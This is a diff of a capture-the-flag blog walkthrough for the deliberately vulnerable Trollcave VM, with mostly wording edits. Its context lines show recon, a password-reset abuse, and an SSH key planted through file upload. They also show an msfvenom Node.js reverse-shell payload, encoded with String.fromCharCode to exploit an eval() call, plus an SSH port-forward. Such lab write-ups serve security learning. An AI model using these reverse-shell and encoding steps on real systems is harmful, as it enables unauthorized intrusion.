@@ -18,7 +18,7 @@ This post documents the complete walkthrough of Trollcave: 1.2, a boot2root [VM]
 
 ### Background
 
-**Trollcave** is a vulnerable VM, in the tradition of [VulnHub][3] and [infosec wargames](https://en.wikipedia.org/wiki/Wargame_(hacking)) in general. You start with a virtual machine you know nothing about — no usernames, no passwords. In this instance, you see a simple community blogging website with a bunch of users. From this initial point, you determine the machine's running services and general characteristics, and devise ways to gain complete control over it by finding and exploiting vulnerabilities and misconfigurations.
+**Trollcave** is a vulnerable VM, in the tradition of [VulnHub][3] and [infosec wargames](https://en.wikipedia.org/wiki/Wargame_(hacking)). You start with a virtual machine you know nothing about — no usernames, no passwords. In this instance, you see a simple community blogging website with a bunch of users. From this initial point, you determine the machine's running services and general characteristics, and devise ways to gain complete control over it, by finding and exploiting vulnerabilities and misconfigurations.
 
 Your first goal is to abuse the services on the machine to gain unauthorized shell access. Your ultimate goal is to read a text file in the `root` user's home directory (`/root/flag.txt`).
 
@@ -44,7 +44,7 @@ PORT   STATE SERVICE REASON         VERSION
 |_http-title: Trollcave
 ```
 
-This is how the site looks like in the browser.
+This is how the site looks like in my browser.
 
 ![screenshot-1](/assets/images/posts/trollcave-walkthrough/screenshot-1.png)
 
@@ -82,7 +82,7 @@ ID	Response   Lines      Word         Chars          Payload
 
 ### Ruby on Rails
 
-I notice [REST](https://en.wikipedia.org/wiki/Representational_state_transfer)ful URLs during cursory browsing of the site, and I believe it's a Ruby on Rails (RoR) web application. The blog post at `/blogs/6` gives it away.
+I notice [REST](https://en.wikipedia.org/wiki/Representational_state_transfer)ful URLs during cursory browsing of the site, and I believe it's a RoR web application. Looks like the blog post at `/blogs/6` nails it.
 
 ```
 # curl -s http://192.168.30.128/ | grep -Po '(href|src)=".{2,}"' | cut -d'"' -f2 | sort | uniq
@@ -184,7 +184,7 @@ The `bcrypt` hashes have salt and a computational cost of 10 rounds; cracking th
 
 ### Password Reset
 
-Recall the blog post above on `password_resets`? Turns out that the well-received Ruby on Rails [tutorial](https://www.railstutorial.org/book) has a [chapter](https://www.railstutorial.org/book/password_reset) on it, and provides a clue on how to proceed.
+Recall the blog post above on `password_resets`? Turns out the well-received RoR [tutorial](https://www.railstutorial.org/book) has a [chapter](https://www.railstutorial.org/book/password_reset) on it, and provides a clue on how to proceed.
 
 ![screenshot-3](/assets/images/posts/trollcave-walkthrough/screenshot-3.png)
 
@@ -214,7 +214,7 @@ The first file I try to upload is some random text; I want to see if there's any
 
 ![screenshot-8](/assets/images/posts/trollcave-walkthrough/screenshot-8.png)
 
-I encounter the first obstacle — can't upload. Well, I'm the **Superadmin** remember? I can go to the **Admin panel** to enable it.
+I encounter the first obstacle — no upload. Well, I'm the **Superadmin** remember? I can go to the **Admin panel** to enable it.
 
 ![screenshot-9](/assets/images/posts/trollcave-walkthrough/screenshot-9.png)
 
@@ -226,15 +226,15 @@ Let's see what happens when I upload a text file.
 
 ![screenshot-11](/assets/images/posts/trollcave-walkthrough/screenshot-11.png)
 
-Once I've uploaded the file, I'm able to view the file information by going to `/user_files/[file_number]` or `/user_files/[file_number].json`.
+After I upload the file, I'm able to view the file information by going to `/user_files/[file_number]` or `/user_files/[file_number].json`.
 
 ![screenshot-12](/assets/images/posts/trollcave-walkthrough/screenshot-12.png)
 
-Now that we know the file's absolute path, we can start to think about exploitation. At the upload page, we see that we can also provide an alternative file name. Is this our ticket in?
+Now that we know the file's absolute path, we can start to think about exploitation. At the upload page, we see that we can provide an alternative file name. Is this our ticket in?
 
 When I gain access to **Superadmin** , I unlock more blog posts and I see a particular blog post and comment that may potentially be the key information to gaining access.
 
-_Image shows user `rails` is present._
+_Image shows user `rails` is present — SSH is possible?_
 
 ![screenshot-13](/assets/images/posts/trollcave-walkthrough/screenshot-13.png)
 
@@ -280,7 +280,7 @@ Let's verify the upload of the public key.
 
 ### Low Privilege Shell
 
-Let's see if we can SSH into the `rails` account.
+Now, let's see if we can SSH into the `rails` account.
 
 ![screenshot-17](/assets/images/posts/trollcave-walkthrough/screenshot-17.png)
 
@@ -300,7 +300,7 @@ If I've to guess, I say this is the way to gain `root` privileges because King i
 
 ![screenshot-19](/assets/images/posts/trollcave-walkthrough/screenshot-19.png)
 
-It's interesting to note that this application is using `eval()`, which I believe firmly is our golden ticket.
+It's interesting to note that this application is using `eval()`, which I firmly believe is our golden ticket.
 
 ![screenshot-21](/assets/images/posts/trollcave-walkthrough/screenshot-21.png)
 
@@ -308,14 +308,14 @@ According to [MDN](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Refer
 
 >The argument of the `eval()` function is a string. If the string represents an expression, `eval()` evaluates the expression. If the argument represents one or more JavaScript statements, `eval()` evaluates the statements. Do not call `eval()` to evaluate an arithmetic expression; JavaScript evaluates arithmetic expressions automatically.
 
-Good thing `msfvenom` is able to generate a reverse shell payload for Node.js, but notice `toString()` after `eval()`? We need to make sure the evaluation returns a string so that `toString()` has something to do.
+Good thing `msfvenom` is able to generate a reverse shell payload for Node.js, but notice `toString()` after `eval()`? We need to make sure `eval()` returns a string so that `toString()` has something to do.
 
 ```
 # msfvenom -p nodejs/shell_reverse_tcp LHOST=192.168.30.128 LPORT=44444 -o rev.js
 # echo '1+1;' >> rev.js  <-- this is to make sure toString() has something to do ;)
 ```
 
-We also need to ensure that our payload is a string. To do that, we can encode our payload into ordinal numbers and piece them back together with `String.fromCharCode()`.
+We also need to ensure that our payload is a string for `eval()`. To do that, we can encode our payload into ordinal numbers and piece them back together with `String.fromCharCode()`.
 
 The following Python code does that.
 
@@ -330,7 +330,7 @@ for c in f.read():
 print 'eval(String.fromCharCode(%s))' % encoded[1:]
 {% endhighlight %}
 
-All that's left to do is to forward local port `tcp/9999` to remote port `tcp/8888` so that I can access it from the browser.
+All that's left to do is to forward our local port `tcp/9999` to the remote port `tcp/8888` so that I can access it from my browser.
 
 ```
 # ssh -L9999:localhost:8888 -i /root/keys/trollcave rails@192.168.30.130 -f -N
